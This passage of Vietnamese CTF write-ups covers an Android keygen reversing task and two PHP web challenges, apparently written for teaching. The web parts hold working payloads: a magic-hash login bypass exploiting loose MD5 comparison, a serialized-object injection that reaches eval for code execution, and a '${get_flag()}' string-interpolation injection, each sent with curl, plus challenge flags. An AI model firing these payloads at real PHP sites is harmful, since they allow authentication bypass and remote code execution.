<code>libnativeCheck.so</code>, 4 file này nằm ở 4 thư mục khác nhau là <code>arm64-v8a</code>, <code>armeabi-v7a</code>, <code>x86</code>, <code>x86_64</code>. Vậy ý nghĩa của 4 thư mục là gì?.</p>\n<p>Đó là vì các điện thoại bây giờ có các loại chip khác nhau, có điện thoại dùng chip arm, có cái xài intel, có cái 32 bit và có cái 64 bit. Để đảm bảo app này chạy được trên mọi loại điện thoại thì mình đã include cả 4 file này vào. 4 file này có tác dụng y chang nhau, chỉ khác về loại assembly code. Nên nếu bạn thích x86 thì có thể chọn file trong thư mục <code>x86</code> để reverse, không thì chọn file trong các thư mục khác cũng chả sao. Mình sẽ chọn file trong thư mục <code>x86</code> để làm tiếp bài này. Mở file bằng IDA, chạy tới hàm <code>Java_com_example_securekeygen_MainActivity_check</code>:</p>\n<pre><code class=\"language-c\"><span class=\"hljs-type\">bool</span> __cdecl <span class=\"hljs-title function_\">Java_com_example_securekeygen_MainActivity_check</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a1, <span class=\"hljs-type\">int</span> a2, <span class=\"hljs-type\">int</span> a3, <span class=\"hljs-type\">int</span> a4)</span>\n{\n  <span class=\"hljs-comment\">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span>\n\n  v4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)(*(<span class=\"hljs-type\">int</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, _DWORD))(*(_DWORD *)a1 + <span class=\"hljs-number\">676</span>))(a1, a3, <span class=\"hljs-number\">0</span>);\n  v5 = strdup(v4);\n  (*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a3, v4);\n  v21 = v5;\n  v26 = <span class=\"hljs-built_in\">strlen</span>(v5);\n  v7 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)(*(<span class=\"hljs-type\">int</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, _DWORD))(*(_DWORD *)a1 + <span class=\"hljs-number\">676</span>))(a1, a4, <span class=\"hljs-number\">0</span>);\n  v28 = strdup(v7);\n  v19 = v7;\n  v8 = v26;\n  (*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a4);\n  v22 = <span class=\"hljs-number\">2</span> * v26;\n  v9 = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">2</span> * v26 + <span class=\"hljs-number\">1</span>);\n  v27 = (<span class=\"hljs-type\">char</span> *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">4</span> * v26 + <span class=\"hljs-number\">1</span>);\n  v23 = v9;\n  <span class=\"hljs-keyword\">if</span> ( v26 &lt;= <span class=\"hljs-number\">0</span> )\n  {\n    v10 = <span class=\"hljs-number\">0</span>;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    <span class=\"hljs-built_in\">memcpy</span>(v9, v21, v26);\n    v10 = v26;\n  }\n  <span class=\"hljs-keyword\">if</span> ( v22 &lt;= v10 )\n  {\n    v14 = v10;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    v24 = v22 + ~v10;\n    v11 = v26;\n    v12 = ((_BYTE)v22 - (_BYTE)v10) &amp; <span class=\"hljs-number\">3</span>;\n    <span class=\"hljs-keyword\">if</span> ( (((_BYTE)v22 - (_BYTE)v10) &amp; <span class=\"hljs-number\">3</span>) != <span class=\"hljs-number\">0</span> )\n    {\n      v13 = v23;\n      <span class=\"hljs-keyword\">do</span>\n      {\n        v23[v10++] = v21[--v11];\n        --v12;\n      }\n      <span class=\"hljs-keyword\">while</span> ( v12 );\n    }\n    <span class=\"hljs-keyword\">else</span>\n    {\n      v13 = v23;\n    }\n    v14 = <span class=\"hljs-number\">2</span> * v26;\n    v9 = v13;\n    v8 = v26;\n    <span class=\"hljs-keyword\">if</span> ( v24 &gt;= <span class=\"hljs-number\">3</span> )\n    {\n      v15 = &amp;v21[v11 - <span class=\"hljs-number\">1</span>];\n      <span class=\"hljs-keyword\">do</span>\n      {\n        v13[v10] = *v15;\n        v13[v10 + <span class=\"hljs-number\">1</span>] = *(v15 - <span class=\"hljs-number\">1</span>);\n        v13[v10 + <span class=\"hljs-number\">2</span>] = *(v15 - <span class=\"hljs-number\">2</span>);\n        v13[v10 + <span class=\"hljs-number\">3</span>] = *(v15 - <span class=\"hljs-number\">3</span>);\n        v10 += <span class=\"hljs-number\">4</span>;\n        v15 -= <span class=\"hljs-number\">4</span>;\n      }\n      <span class=\"hljs-keyword\">while</span> ( v22 != v10 );\n      v14 = <span class=\"hljs-number\">2</span> * v26;\n      v8 = v26;\n    }\n  }\n  v25 = <span class=\"hljs-number\">4</span> * v8;\n  v9[v14] = <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-keyword\">if</span> ( v8 &gt; <span class=\"hljs-number\">0</span> )\n  {\n    v16 = <span class=\"hljs-number\">0</span>;\n    v17 = v27;\n    <span class=\"hljs-keyword\">do</span>\n    {\n      sub_950(v17, <span class=\"hljs-number\">-1</span>, v19, v23[v16++]);\n      v17 += <span class=\"hljs-number\">2</span>;\n    }\n    <span class=\"hljs-keyword\">while</span> ( v16 &lt; v22 );\n  }\n  v27[v25] = <span class=\"hljs-number\">0</span>;\n  v20 = <span class=\"hljs-built_in\">strcmp</span>(v27, v28) == <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-built_in\">free</span>(v27);\n  <span class=\"hljs-built_in\">free</span>(v23);\n  <span class=\"hljs-built_in\">free</span>(v21);\n  <span class=\"hljs-built_in\">free</span>(v28);\n  <span class=\"hljs-keyword\">return</span> v20;\n}\n</code></pre>\n<p>Bạn có thể đổi type của biến <code>a1</code> thành <code>JNIEnv*</code>, sau đó code sẽ trông rất đẹp. Các đoạn code kiểu như:</p>\n<pre><code class=\"language-c\">(*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a3, v4);\n</code></pre>\n<p>sẽ được đổi thành</p>\n<pre><code class=\"language-c\">(*a1)-&gt;ReleaseStringUTFChars(a1, (jstring)a3, v4);\n</code></pre>\n<p><strong>Cách giải 1: static</strong></p>\n<p>Chỉ bằng việc đọc code, ta có thể thấy nó làm các việc sau: (viết theo syntax python cho ngắn)</p>\n<ul>\n<li><code>tmp = name + name[::-1]</code></li>\n<li><code>tmp = hex_encode(tmp)</code></li>\n<li>So sánh tmp với key.</li>\n</ul>\n<p><strong>Cách giải 2: dynamic</strong></p>\n<ul>\n<li>TODO</li>\n</ul>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{68636d757340666f72746e69676874746867696e74726f664073756d6368}\n</code></pre>\n","list":[]}]},{"name":"Web exploitation","tags":[],"detail":"","list":[{"name":"DameDame","tags":["https://img.shields.io/badge/Category-web-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg","https://img.shields.io/badge/Solves-50-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Dame dame</h2>\n<p><img src=\"https://img.shields.io/badge/Category-web-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-50-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>MD5 is sooo cool lol. How can people possibly get access to my admin panel, even I can’t either lmao.</p>\n<h3>Hints</h3>\n<ul>\n<li>none</li>\n</ul>\n<h3>Attached files</h3>\n<p><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/DameDame/index.php\">index.php</a></p>\n<h3>Summary</h3>\n<blockquote>\n<p>Giới thiệu về <strong>magic hash</strong></p>\n</blockquote>\n<h3>Detailed solution</h3>\n<p>Đây là 1 challenge khá đơn giản và rất dễ thấy với những ai đã biết về thuật ngữ <code>magic hash</code>.</p>\n<p>Để web app gửi về flag, 3 điều kiện cần phải được thỏa mãn:</p>\n<ol>\n<li><code>$_POST[&quot;username&quot;] == $username</code></li>\n<li><code>md5($_POST[&quot;password&quot;]) == md5($password)</code></li>\n<li><code>$_POST[&quot;password&quot;] != $password</code></li>\n</ol>\n<p>Để qua được 2 điều kiện đầu thì chỉ cần nhập đúng <code>username</code> và <code>password</code> có trong file, nhưng cách đó sẽ không thỏa được điều kiện thứ 3. Mục tiêu hiện tại là cần tìm ra 1 <code>password</code> sao cho <code>md5($pasword) == md5(&quot;240610708&quot;)</code> và <code>$password != &quot;240610708&quot;</code>.</p>\n<p>Các bạn có thể thấy phép so sánh được sử dụng là <code>==</code> thay vì <code>===</code>. Cách này không được khuyến khích vì phép so sánh <code>==</code> có thể xảy ra những trường hợp ngoại lệ vì PHP sẽ cố “cast” 2 giá trị về cùng 1 kiểu dữ liệu và so sánh.</p>\n<p><img src=\"https://ruempler.eu/2015/01/03/the-php-equality-table/table.png\" alt=\"\"></p>\n<p>Điều này dẫn ra một phương pháp tấn công với những trang web sử dụng authentication bằng cách hash mật khẩu. Ví dụ với snippet sau:</p>\n<pre><code class=\"language-php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-number\">0</span> == <span class=\"hljs-string\">&quot;0e123123123123123&quot;</span>) {\n  <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;equal&quot;</span>;\n}\n</code></pre>\n<p><code>equal</code> sẽ được in ra, vì khi sử dụng phép so sánh <code>==</code>, php sẽ thử chuyển giá trị <code>0e123123123123123</code> về dạng <code>integer</code>. Khi đó, $0^{123123123123123} = 0$</p>\n<p>Nghĩa là nếu 2 mật khẩu hoàn toàn khác nhau nhưng hash của chúng có dạng <code>/0e[0-9]+/</code>, việc sử dụng phép so sánh <code>==</code> sẽ làm chương trình tưởng rằng đó là 1 mật khẩu, dẫn tới lỗ hổng về authentication. Các giá trị hash được nói ở trên được gọi chung là <code>magic hash</code>.</p>\n<p>Và tình cờ thay, mật khẩu của admin trong challenge này cũng là một magic hash</p>\n<pre><code class=\"language-php\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-string\">&quot;240610708&quot;</span>); <span class=\"hljs-comment\">// 0e462097431906509019562988736854</span>\n</code></pre>\n<p>Tóm lại, để vượt qua điều kiện thứ 3 của challenge này thì bạn chỉ cần truyền đúng <code>username</code> và <code>password</code> là 1 magic hash của hàm <code>md5</code>, danh sách các magic hash có thể tìm thấy rất nhiều trên mạng, mình lấy con số <code>240610708</code> từ <a href=\"https://github.com/spaze/hashes/blob/master/md5.md\">trang github này</a></p>\n<pre><code class=\"language-bash\">&gt; curl -X POST --url <span class=\"hljs-string\">&quot;http://103.245.249.107:35000/&quot;</span> -d <span class=\"hljs-string\">&quot;username=admin&amp;password=NWWKITQ&quot;</span>\n\nWell <span class=\"hljs-keyword\">done</span>, here is your flag f0rtn1ght{0h_so_M4g1c_h4Sh_i5_a_tH1ng_hUh?}\n</code></pre>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{0h_so_M4g1c_h4Sh_i5_a_tH1ng_hUh?}\n</code></pre>\n","list":[]},{"name":"OOPS","tags":["https://img.shields.io/badge/Category-web-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg","https://img.shields.io/badge/Solves-25-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: OOPs (Object oriented programming - supreme)</h2>\n<p><img src=\"https://img.shields.io/badge/Category-web-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-25-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>Have you ever heard of OOP? Making the code works is one thing, making it maintainable is another thing lol. Just look at my perfectly-designed-OOP code and learn.</p>\n<h3>Hints</h3>\n<ul>\n<li>none</li>\n</ul>\n<h3>Attached files</h3>\n<p><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/OOPS/index.php\">index.php</a></p>\n<h3>Summary</h3>\n<blockquote>\n<p>Giới thiệu về <strong>object injection in php</strong></p>\n</blockquote>\n<h3>Detailed solution</h3>\n<p>Nhìn sơ qua thì trang web này đã setup khá cồng kềnh chỉ để làm 1 việc là in ra những gì mà mình đã nhập vào. Cách hoạt động sẽ diễn ra như sau:</p>\n<ol>\n<li>Người dùng nhập nội dung vào <code>input</code>, hàm <code>handleSend</code> sẽ tạo ra 1 <code>serialized</code> object và base64 encode, sau đó reload lại trang web kèm với param <code>?msg=&lt;encoded&gt;</code></li>\n<li>Trang web nhận param <code>msg</code> và giải mã thành 1 object, sau đó lấy nội dung của <code>msg[&quot;content&quot;]</code> và tạo 1 object <code>Logger</code>, khởi tạo attribute <code>$command = 'echo (&quot;' . $message . '&quot;);'</code></li>\n<li>Class <code>Logger</code> được khai báo hàm <code>_destruct</code>, luôn được gọi khi object bị deallocate, bên trong hàm <code>_destruct</code> sẽ gọi <code>eval($this-&gt;command)</code>.</li>\n<li>Nếu quá trình deserialize có vấn đề, 1 object <code>Logger</code> khác sẽ được gọi để in ra “Oops, something happened”.</li>\n<li>Khi đoạn code chạy hoàn tất, object <code>Logger</code> được khởi tạo sẽ bị deallocate, gọi hàm <code>_destruct</code> và in ra input mà bạn đã nhập.</li>\n</ol>\n<p>Vấn đề ở quá trình này đó là thay vì nhận string <code>input</code>, trang web lại nhận về 1 serialized object <em>có vẻ như</em> là một object chứa <code>content</code> là input của người dùng. Cách làm này mở ra một phương pháp exploit gọi là <code>object injection</code>.</p>\n<p>Bởi vì hàm <code>unserialize</code> có thể giữ nguyên cấu trúc của 1 object tương ứng với 1 class nào đó, chúng ta có thể truyền một serialized object của class <code>Logger</code>. Và vì attribute của class này là 1 câu lệnh để gọi trong hàm <code>eval</code>, chúng ta cũng hoàn toàn có thể kiểm soát những gì xảy ra trong hàm này, dẫn tới lỗi RCE.</p>\n<p>Vậy nên phương pháp để giải challenge này đó là khai báo class <code>Logger</code> giống như trên web, tạo 1 object tương ứng và lưu giá trị <code>$command</code> của nó thành <code>get_flag();</code>, <code>serialize</code> và <code>base64_encode</code> để gửi cho server. Tuy nhiên, vì code đã mặc định coi serialized object là <code>Array</code>, vậy nên, object cần gửi sẽ phải là 1 array có chứa object <code>Logger</code>.</p>\n<pre><code class=\"language-bash\">&gt; curl <span class=\"hljs-string\">&quot;http://103.245.249.107:35001/?msg=<span class=\"hljs-subst\">$(echo &#x27;a:1:{i:0;O:6:<span class=\"hljs-string\">&quot;Logger&quot;</span>:1:{s:7:<span class=\"hljs-string\">&quot;command&quot;</span>;s:11:<span class=\"hljs-string\">&quot;get_flag();&quot;</span>;}}&#x27; | base64 --wrap=0)</span>&quot;</span>\n\n&lt;html&gt;\n  &lt;<span class=\"hljs-built_in\">head</span>&gt;\n    &lt;title&gt;Object oriented programming - supreme&lt;/title&gt;\n    &lt;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">&quot;stylesheet&quot;</span> href=<span class=\"hljs-string\">&quot;static/style.css&quot;</span>&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;\n    &lt;h1&gt;Message echo-er&lt;/h1&gt;\n    &lt;h3&gt;Repeats the messages you want to send to yourself.&lt;/h3&gt;\n    &lt;div class=<span class=\"hljs-string\">&quot;container&quot;</span>&gt;\n      &lt;div <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">&quot;form&quot;</span> class=<span class=\"hljs-string\">&quot;content&quot;</span>&gt;\n        &lt;h2&gt;Send your messages here:&lt;/h2&gt;\n        &lt;input <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">&quot;message&quot;</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> placeholder=<span class=\"hljs-string\">&quot;your message&quot;</span>&gt;\n        &lt;button onclick=<span class=\"hljs-string\">&quot;handleSend()&quot;</span>&gt;\n          Send!\n        &lt;/button&gt;\n      &lt;/div&gt;\n      &lt;div class=<span class=\"hljs-string\">&quot;message&quot;</span>&gt;\n        &lt;h2&gt;Your message&lt;/h2&gt;\n              &lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;script&gt;\n      <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">handleSend</span></span>() {\n        const elem = document.getElementById(<span class=\"hljs-string\">&quot;message&quot;</span>);\n        const message = elem.value;\n        serialized_obj = `a:1:{s:7:<span class=\"hljs-string\">&quot;content&quot;</span>;s:<span class=\"hljs-variable\">${message.length}</span>:<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">${message}</span>&quot;</span>;}`;\n\n        console.log(serialized_obj, btoa(serialized_obj));\n\n        document.location = document.location.origin + <span class=\"hljs-string\">&quot;?msg=&quot;</span> + btoa(serialized_obj);\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;You sent the message: f0rtn1ght{a5_l0ng_As_1t_w0rk5}\n</code></pre>\n<h3>Note</h3>\n<p>Vì người ra đề này vẫn còn non tay nên đã không restrict kĩ hơn, cho phép mọi người tùy ý RCE challenge này, vậy nên mình rất cảm ơn các bạn tham gia đã không làm sập trang web 🙏</p>\n<p>Ngoài ra, việc ghép <code>'echo (&quot;' . $message . '&quot;);'</code> như thế này cũng cho phép RCE mà không cần object injection vì bạn vẫn có thể gọi bất cứ hàm nào bằng cách sử dụng tính năng <a href=\"https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing\">string parsing</a> của php. Nên uninteded sol của bài là chỉ cần nhập <code>${get_flag()}</code> là bạn vẫn có thể lấy được flag.</p>\n<p>Mong các bạn thứ lỗi</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{a5_l0ng_As_1t_w0rk5}\n</code></pre>\n","list":[]}]}]}]}